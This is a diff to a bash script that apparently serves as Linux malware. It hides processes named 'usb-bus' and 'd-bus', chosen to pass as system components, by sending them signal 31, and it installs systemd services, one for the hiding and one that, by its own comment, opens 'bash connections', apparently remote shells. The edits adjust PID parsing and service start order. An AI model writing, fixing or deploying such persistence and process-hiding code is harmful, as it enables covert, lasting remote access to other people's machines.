@@ -13,13 +13,13 @@ while true; do
 
 #hide usb-bus and d-bus, which are the scripts that the systemd services execute
 bash_pid=$(ps aux | awk '{ if($11 ~ /bash/) print $2 }')
-while read hide_pid; do
-  cmdline=$(cat /proc/$hide_pid/cmdline)
+while read -d " " hide_pid; do
+  cmd=$(cat /proc/$hide_pid/cmdline)
   cat /proc/$hide_pid/cmdline &>/dev/null
   if [ "$?" == "1" ]; then
     continue
   fi
-  if [ "$cmdline" == "/bin/bash/var/lib/usb-bus/usb-bus" ] || [ "$cmdline" == "/bin/bash/usr/local/share/d-bus/d-bus" ]; then
+  if [ "$cmd" == "/bin/bash/var/lib/usb-bus/usb-bus" ] || [ "$cmd" == "/bin/bash/usr/local/share/d-bus/d-bus" ]; then
     kill -31 $hide_pid
     #echo "hid systemd service pid: $hide_pid"
   fi
@@ -53,7 +53,7 @@ EOF
 #that's the systemd service that's gonna do the hiding
 hiding_service=$(cat << \EOF
 [Unit]
-After=network.target
+After=multi-user.target
 StartLimitIntervalSec=0
 
 [Service]
@@ -84,7 +84,7 @@ EOF
 #that's the systemd service that's gonna open the bash connections
 bash_service=$(cat << \EOF
 [Unit]
-After=network.target
+After=multi-user.target
 StartLimitIntervalSec=0
 
 [Service]
